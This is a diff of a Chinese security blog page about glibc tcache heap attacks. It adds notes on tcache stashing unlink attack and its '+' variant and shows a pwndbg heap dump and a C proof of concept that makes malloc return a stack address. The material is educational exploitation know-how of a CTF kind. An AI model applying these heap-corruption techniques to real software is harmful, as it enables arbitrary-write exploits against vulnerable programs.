@@ -29,7 +29,7 @@
 <meta property="og:description" content="Ptmalloc算法：Tcache Attack在 Glibc的2.26 中新增了Tcache机制，这是ptmalloc2的缓存机制 Tcache是 libc-2.26 之后引入的一种机制（类似于fastbin），而 Tcache Attack 则是针对 libc-2.26 及其后续版本的攻击 整体的攻击形式和fastbin类似  Tcache 源码每条链上最多可以有7个chunk，free的时候">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2022-02-09T09:17:59.000Z">
-<meta property="article:modified_time" content="2023-04-17T10:09:50.489Z">
+<meta property="article:modified_time" content="2023-04-26T01:23:52.477Z">
 <meta property="article:author" content="yhellow">
 <meta property="article:tag" content="Tcache attack">
 <meta property="article:tag" content="ptmalloc">
@@ -193,7 +193,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-17 18:09:50" itemprop="dateModified" datetime="2023-04-17T18:09:50+08:00">2023-04-17</time>
+                <time title="Modified: 2023-04-26 09:23:52" itemprop="dateModified" datetime="2023-04-26T09:23:52+08:00">2023-04-26</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -217,7 +217,7 @@
               <span class="post-meta-item-icon">
                 <i class="far fa-file-word"></i>
               </span>
-              <span>14k</span>
+              <span>15k</span>
             </span>
             <span class="post-meta-item" title="Reading time">
               <span class="post-meta-item-icon">
@@ -341,9 +341,35 @@
 <p>关键在于：使 <code>&#39;0x40&#39; tcache</code> 中装有 <code>&#39;0x60&#39; tcache addr</code> ，使其可以通过申请“0x30”来修改 <code>&#39;0x60&#39; tcache</code> 的地址（劫持大小为“0x60”的tcachebin）</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>xg <span class="number">0x558b1cfcd000</span></span><br><span class="line"><span class="number">0x558b1cfcd000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// 申请&quot;0x48&quot;</span></span><br><span class="line"><span class="number">0x558b1cfcd010</span>:	<span class="number">0x0001000200000000</span>	<span class="number">0x0000000000000001</span></span><br><span class="line"><span class="number">0x558b1cfcd020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd030</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000051</span> <span class="comment">// 申请&quot;0x48&quot;</span></span><br><span class="line"><span class="number">0x558b1cfcd060</span>:	<span class="number">0x0000000558b1ce3c</span>	<span class="number">0x0000558b1cfcd010</span> <span class="comment">// 释放第二个&quot;0x40&quot;</span></span><br><span class="line"><span class="number">0x558b1cfcd070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x558b1cfcd0a0</span>:	<span class="number">0x0000558b1cfcd0b0</span>	<span class="number">0x0000558b1cfcd060</span> <span class="comment">// &#x27;0x40&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 伪造&#x27;0x40&#x27;的tcache(带有main_arena) */</span> </span><br><span class="line"><span class="number">0x558b1cfcd0b0</span>:	<span class="number">0x00007fea097ddc00</span>	<span class="number">0x00007fea097ddc00</span> <span class="comment">// &#x27;0x60&#x27;的tcache</span></span><br><span class="line">    		<span class="comment">/* 这里曾经是unsortedbin,所以main_arena留下来了 */</span></span><br></pre></td></tr></table></figure>
 <p><strong>tcache stashing unlink attack</strong></p>
+<p>很多时候常常把 tcache stashing unlink attack 和 tcache stashing unlink attack+ 称为同一种技术，但它们的功能不同</p>
+<p>具体的利用方式如下：</p>
+<ul>
+<li><code>tcachebin[A]</code> 为空</li>
+<li><code>smallbin[A]</code> 有 <code>8</code> 个</li>
+<li>修改第 <code>8</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code></li>
+<li>分配 <code>malloc(A)</code> 的时候，<code>addr+0x10</code> 会被写一个 <code>libc</code> 地址</li>
+</ul>
+<p><strong>tcache stashing unlink attack+</strong></p>
 <p>这种攻击利用的是 tcache bin 中有剩余（数量小于 TCACHE_MAX_BINS）时，同大小的 small bin 会放进 tcache 中（这种情况可以使用 calloc 分配同大小堆块触发，因为 calloc 分配堆块时不从tcache bin 中选取）</p>
 <p>在获取到一个 smallbin 中的一个 chunk 后，如果 tcache 任由足够空闲位置，会将剩余的 smallbin 挂进 tcache 中，在这个过程中只对第一个 bin 进行了完整性检查，后面的堆块的检查缺失</p>
 <p>当攻击者可以修改一个 small bin 的 bk 时，就可以实现在任意地址上写一个 libc 地址</p>
+<p>具体有两种伪造方法：</p>
+<ul>
+<li>第一种，适用于没有 calloc：<ul>
+<li><code>tcachebin[A]</code> 为空</li>
+<li><code>smallbin[A]</code> 有 <code>8</code> 个</li>
+<li>修改第 <code>7</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code>，还要保证 <code>addr+0x18</code> 是一个合法可写的地址</li>
+<li>分配 <code>malloc(A)</code> 的时候，<code>addr</code> 会被链入到 <code>tcachebin</code>，也就是可以分配到 <code>addr</code> 处</li>
+</ul>
+</li>
+<li>第二种，适用于有 calloc 但限制了申请次数：<ul>
+<li><code>tcachebin[A]</code> 不为满（如果程序中存在 malloc，则可以忽略此条件）</li>
+<li><code>smallbin[A]</code> 有 <code>2</code> 个</li>
+<li>修改第 <code>2</code> 个 <code>smallbin chunk</code> 的 <code>bk</code> 为 <code>addr</code>，还要保证 <code>addr+0x18</code> 是一个合法可写的地址</li>
+<li>分配 <code>calloc(A)</code> 的时候，<code>addr</code> 会被链入到 <code>tcachebin</code>，也就是可以分配到 <code>addr</code> 处</li>
+</ul>
+</li>
+</ul>
 <p>测试案例：</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *target;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;stack_var addr is:%p\n&quot;</span>,&amp;stack_var[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;chunk_lis addr is:%p\n&quot;</span>,&amp;chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target addr is:%p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    </span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;target now: %p\n&quot;</span>,(<span class="keyword">void</span>*)target);</span><br><span class="line"></span><br><span class="line">    assert(target == &amp;stack_var[<span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>刚刚释放掉9个 chunk 后：</p>
@@ -465,7 +491,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">244</span>
+          <span class="site-state-item-count">245</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -478,7 +504,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">140</span>
+        <span class="site-state-item-count">142</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -519,7 +545,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="Reading time total">49:38</span>
+    <span title="Reading time total">50:07</span>
 </div>
   <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
   </div>
